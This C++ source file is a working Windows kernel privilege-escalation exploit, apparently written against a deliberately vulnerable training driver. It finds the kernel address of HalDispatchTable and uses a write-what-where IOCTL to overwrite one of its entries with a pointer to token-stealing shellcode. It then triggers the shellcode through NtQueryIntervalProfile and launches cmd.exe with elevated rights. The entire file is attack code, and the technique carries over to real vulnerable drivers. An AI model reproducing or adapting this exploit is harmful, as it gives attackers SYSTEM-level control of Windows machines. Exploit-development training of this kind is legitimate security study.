#include <Windows.h>
#include "stdio.h"
#include "string.h"
#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11,
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_ENTRY {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG Count;
	SYSTEM_MODULE_ENTRY Modules[1]; // ntoskrnl is the first entry
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef NTSTATUS(WINAPI* pNtQuerySystemInformation)(
	IN			 SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT			 PVOID					  SystemInformation,
	IN			 ULONG				 	  SystemInformationLEngth,
	OUT OPTIONAL PULONG					  ReturnLength
	);

typedef NTSTATUS(WINAPI* pNtQueryIntervalProfile)(
	IN PULONG neverMind,
	OUT PULONG neverMind2
	);

PVOID getHalDispatchTableAddr();

DWORD Solutions::TriggerWriteWhatWhere() {
	// overwrite the second pointer in the HalDispatchTable with shellcode address 

	DWORD dwBufSize = 8;
	ULONG where = (ULONG)getHalDispatchTableAddr() + 4; // second entry
	if (!(where - 4)) {
		wprintf(L"[-] Failed getting halDispatchTable address");
		return 1;
	}

	ULONG pTokenStealingShellcode = (ULONG)(tokenStealingShellcodeWriteWhatWhere);
	ULONG what = (ULONG)(&pTokenStealingShellcode);
	PUCHAR lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);
	DWORD dwBytesReturned = 0;

	if (!lpInBuffer) {
		wprintf(L"[-] Could not allocate buffer :(\n");
		return 1;
	}

	wprintf(L"[+] Allocated buffer with %d bytes\n", dwBufSize);

	*(PULONG)lpInBuffer = what;
	*(PULONG)(lpInBuffer + sizeof(ULONG)) = where;

	if (!DeviceIoControl(_hDeviceHandle, IOCTL_WRITE_WHAT_WHERE, lpInBuffer, dwBufSize,
						NULL, NULL, &dwBytesReturned, NULL)) {
		wprintf(L"[-] Could not interact with the driver :(\n");
		HeapFree(GetProcessHeap(), NULL, lpInBuffer);
		return 1;
	}

	wprintf(L"[+] Succsfully talked with the driver\n");

	HMODULE ntdll = GetModuleHandle(L"ntdll");
	auto query = (pNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	ULONG a = 1;
	query((PULONG)0xdeadbeef, &a);

	system("cmd.exe");

	return 0;
}

PVOID getHalDispatchTableAddr() {
	ULONG modulesLength = 0;
	PSYSTEM_MODULE_INFORMATION pModuleInfo = NULL;

	HMODULE ntdll = GetModuleHandle(L"ntdll");
	auto query = (pNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");

	query(SystemModuleInformation, NULL, NULL, &modulesLength);
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, modulesLength);
	if (!pModuleInfo) {
		wprintf(L"[-] could not allocate buffer for modules\n");
		return NULL;
	}

	query(SystemModuleInformation, (PVOID)pModuleInfo, modulesLength, NULL);
	if (!modulesLength) {
		wprintf(L"[-] Failed retriving modules information\n");
		return NULL;
	}

	PVOID ntoskrnlBase = 0;
	ULONG ntoskrnlOffset = 0;
	PCHAR ntoskrnlFullPath = 0;
	for (int i = 0; i < pModuleInfo->Count; i++) {
		if (!strcmp((const char*)pModuleInfo->Modules[i].FullPathName + pModuleInfo->Modules[i].OffsetToFileName, "ntoskrnl.exe")) {
			ntoskrnlBase = pModuleInfo->Modules[i].ImageBase;
		}
	}
	HeapFree(GetProcessHeap(), NULL, pModuleInfo);

	if (ntoskrnlBase == 0) {
		wprintf(L"[-] Could not found ntoskrnl.exe module");
		return NULL;
	}

	wprintf(L"[+] ntoskrnl image base 0x%x\n", ntoskrnlBase);
	
	HMODULE hNtoskrnl = LoadLibrary(L"ntoskrnl.exe");
	if (!hNtoskrnl) {
		wprintf(L"[-] could not load library ntoskrnl.exe - %d\n", GetLastError());
		return NULL;
	}

	PVOID pHalUserLand = GetProcAddress(hNtoskrnl, "HalDispatchTable");
	if (!pHalUserLand) {
		wprintf(L"[-] could not get halDispatchTable addres\n");
		return NULL;
	}
	wprintf(L"[+] HalDispatchTable usermode address: 0x%x\n", pHalUserLand);
	
	PVOID HalDispatchTable = (PVOID)((ULONG)pHalUserLand - (ULONG)hNtoskrnl + (ULONG)ntoskrnlBase);
	wprintf(L"[+] HalDispatchTable kernelmode address: 0x%x\n", (ULONG)HalDispatchTable);
	
	return HalDispatchTable;
}